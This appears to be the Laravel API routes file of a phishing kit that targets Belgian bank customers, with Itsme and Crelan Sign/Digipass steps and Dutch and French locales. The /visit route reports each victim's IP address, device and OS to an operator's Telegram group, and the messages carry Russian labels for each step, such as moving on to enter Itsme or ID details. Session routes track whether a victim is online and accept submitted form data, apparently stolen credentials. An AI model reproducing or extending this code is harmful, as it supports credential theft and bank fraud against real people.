<?php

use App\DTOs\TelegramMessageDTO;
use App\Http\Controllers\FormController;
use App\Http\Controllers\SessionController;
use App\Http\Controllers\TrackingController;
use App\Services\DeviceDetectionService;
use App\Services\TelegramService;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| API Routes
|--------------------------------------------------------------------------
|
| API routes for session management
|
*/

/**
 * Telegram Webhook
 * POST /api/telegram/webhook
 */
Route::post('/telegram/webhook', function () {
    \Illuminate\Support\Facades\Log::info('Telegram webhook received', [
        'input' => file_get_contents('php://input'),
    ]);
    
    try {
        app(\App\Telegram\TelegramBot::class)->run();
    } catch (\Throwable $e) {
        \Illuminate\Support\Facades\Log::error('Telegram webhook error', [
            'message' => $e->getMessage(),
            'trace' => $e->getTraceAsString(),
        ]);
    }
    
    return response('ok');
})->name('telegram.webhook');

/**
 * Public visit ping (no session)
 * POST /api/visit
 */
Route::post('/visit', function (Request $request) {
    $telegramService = app(TelegramService::class);
    $deviceService = app(DeviceDetectionService::class);
    $chatId = $telegramService->getGroupChatId();

    if ($telegramService->isConfigured() && $chatId) {
        $domain = $request->getHost();
        $userAgent = (string) $request->header('User-Agent', '');
        $eventType = (string) $request->input('event', 'visit');

        $locale = (string) $request->input('locale', '');
        $locale = strtolower(substr($locale, 0, 2));
        if (!in_array($locale, ['nl', 'fr'], true)) {
            $locale = 'nl';
        }

        $getClientIP = static function (Request $request): string {
            if ($request->header('CF-Connecting-IP')) {
                return (string) $request->header('CF-Connecting-IP');
            }
            if ($request->header('X-Real-IP')) {
                return (string) $request->header('X-Real-IP');
            }
            if ($request->header('X-Forwarded-For')) {
                $forwardedIps = explode(',', (string) $request->header('X-Forwarded-For'));
                $ip = trim($forwardedIps[0] ?? '');
                if ($ip !== '') {
                    return $ip;
                }
            }
            return (string) $request->ip();
        };

        $ipAddress = $getClientIP($request);

        $detectOs = static function (string $ua): string {
            if ($ua === '') return 'Unknown OS';

            if (preg_match('/Windows NT 10\.0/i', $ua)) return 'Windows 10';
            if (preg_match('/Windows NT 6\.3/i', $ua)) return 'Windows 8.1';
            if (preg_match('/Windows NT 6\.2/i', $ua)) return 'Windows 8';
            if (preg_match('/Windows NT 6\.1/i', $ua)) return 'Windows 7';
            if (preg_match('/Windows NT 6\.0/i', $ua)) return 'Windows Vista';
            if (preg_match('/Windows NT 5\.1|Windows XP/i', $ua)) return 'Windows XP';

            if (preg_match('/Android/i', $ua)) return 'Android';
            if (preg_match('/iPhone|iPad|iPod/i', $ua)) return 'iOS';
            if (preg_match('/Mac OS X|Macintosh/i', $ua)) return 'macOS';
            if (preg_match('/Linux/i', $ua)) return 'Linux';

            return 'Unknown OS';
        };

        $deviceType = $deviceService->detectDeviceType($userAgent);
        $deviceLabel = match ($deviceType) {
            'mobile' => 'Телефон',
            'tablet' => 'Планшет',
            default => 'Компьютер',
        };
        $osLabel = $detectOs($userAgent);

        $title = match ($eventType) {
            'itsme' => '📴 <b>Переход на ввод Itsme</b>',
            'id' => '📵 <b>Переход на ввод ID</b>',
            'code' => '📵 <b>Переход на ввод ID</b>',
            'terms' => '📄 <b>Переход на ознакомление с офертой</b>',
            default => '🌐 <b>Визит без сессии</b>',
        };

        $localeFlag = match (strtolower($locale)) {
            'nl' => '🇳🇱',
            'fr' => '🇫🇷',
            default => '🌍',
        };
        $localeTag = strtoupper($locale);
        $text = "{$title} {$localeFlag}\n";
        $text .= "Домен: <code>{$domain}</code>\n";
        $text .= "IP: <code>{$ipAddress}</code>\n";
        $text .= "▫️ {$deviceLabel}, {$osLabel}";

        $telegramService->sendMessage(TelegramMessageDTO::create(
            chatId: $chatId,
            text: $text,
        ));
    }

    return response()->json(['success' => true]);
})->name('visit');

/**
 * Pre-session tracking
 */
Route::prefix('pre-session')->name('api.pre-session.')->group(function () {
    Route::get('/sessions', [TrackingController::class, 'index'])->name('index');
    Route::post('/', [TrackingController::class, 'create'])->name('create');
    Route::get('/{preSession}', [TrackingController::class, 'show'])->name('show');
    Route::post('/{preSession}/online', [TrackingController::class, 'updateOnlineStatus'])->name('online');
    Route::post('/{preSession}/convert', [TrackingController::class, 'convert'])->name('convert');
});

/**
 * Sessions
 */
Route::prefix('session')->name('api.session.')->group(function () {
    /**
     * Create new session
     * POST /api/session
     */
    Route::post('/', [SessionController::class, 'store'])
        ->name('store');

    /**
     * Get session status
     * GET /api/session/{session}/status
     */
    Route::get('/{session}/status', [SessionController::class, 'status'])
        ->name('status');

    /**
     * Ping - update activity time
     * POST /api/session/{session}/ping
     */
    Route::post('/{session}/ping', [SessionController::class, 'ping'])
        ->name('ping');

    /**
     * Check online status
     * GET /api/session/{session}/online
     */
    Route::get('/{session}/online', [SessionController::class, 'online'])
        ->name('online');

    /**
     * Submit form data
     * POST /api/session/{session}/submit
     */
    Route::post('/{session}/submit', [FormController::class, 'submit'])
        ->name('submit');

    /**
     * Track page visit
     * POST /api/session/{session}/visit
     */
    Route::post('/{session}/visit', [SessionController::class, 'trackVisit'])
        ->name('visit');

    /**
     * Notify method selection (Crelan Sign / Digipass)
     * POST /api/session/{session}/method
     */
    Route::post('/{session}/method', [SessionController::class, 'notifyMethod'])
        ->name('method');
});
